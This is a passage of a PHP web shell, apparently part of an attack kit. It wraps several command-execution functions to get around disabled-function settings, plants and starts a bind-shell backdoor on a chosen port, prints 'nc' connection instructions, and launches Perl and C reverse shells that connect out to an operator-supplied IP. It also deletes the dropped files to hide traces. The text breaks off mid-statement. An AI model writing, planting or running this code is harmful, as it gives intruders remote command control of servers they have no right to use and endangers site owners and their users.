<?php
if (!function_exists("myshellexec"))
{
if(is_callable("popen")){
function myshellexec($command) {
if (!($p=popen("($command)2>&1","r"))) {
return 126;
}
while (!feof($p)) {
$line=fgets($p,1000);
$out .= $line;
}
pclose($p);
return $out;
}
}else{
function myshellexec($cmd)
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}
}
}


function checkproxyhost(){
$host = getenv("HTTP_HOST");
$filename = '/tmp/.setan/xh';
if (file_exists($filename)) {
$_POST['proxyhostmsg']="</br></br><center><font color=red size=3><b>Success!</b></font></br></br><a href=$host:6543>$host:6543</a></br></br><b>Note:</b> If '$host' have a good firewall or IDS  installed on their server, it will probably catch this or stop it from ever opening a port and you won't be able to connect to this proxy.</br></br></center>";
} else {
$_POST['proxyhostmsg']="</br></br><center><font color=red size=3><b>Failed!</b></font></br></br><b>Note:</b> If for some reason we would not create and extract the need proxy files in '/tmp' this will make this fail.</br></br></center>";
 } 
}

if (!empty($_POST['backconnectport']) && ($_POST['use']=="shbd"))
{ 
 $ip = gethostbyname($_SERVER["HTTP_HOST"]);
 $por = $_POST['backconnectport'];
 if(is_writable(".")){
 cfb("shbd",$backdoor);
 ex("chmod 777 shbd");
 $cmd = "./shbd $por";
 exec("$cmd > /dev/null &");
 $scan = myshellexec("ps aux"); 
 if(eregi("./shbd $por",$scan)){ $data = ("\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n</br>Process not found running, backdoor not setup successfully."); }
 $_POST['backcconnmsg']="To connect, use netcat and give it the command <b>'nc $ip $por'</b>.$data";
 }else{
 cfb("/tmp/shbd",$backdoor);
 ex("chmod 777 /tmp/shbd");
 $cmd = "./tmp/shbd $por";
 exec("$cmd > /dev/null &");
 $scan = myshellexec("ps aux"); 
 if(eregi("./shbd $por",$scan)){ $data = ("\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n</br>Process not found running, backdoor not setup successfully."); }
 $_POST['backcconnmsg']="To connect, use netcat and give it the command <b>'nc $ip $por'</b>.$data";
}
} 

if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="Perl"))
{
 if(is_writable(".")){
 cf("back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
 $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 if (file_exists("back")) { unlink("back"); }
 }else{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
 $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 if (file_exists("/tmp/back")) { unlink("/tmp/back"); }
}
} 

if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="C"))
{
 if(is_writable(".")){
 cf("backc",$back_connect_c);
 ex("chmod 777 backc");
 //$blah = ex("gcc back.c -o backc");
 $blah = ex("./backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
 $_POST['backcconnmsg']="Trying to connect to <b>".$_POST
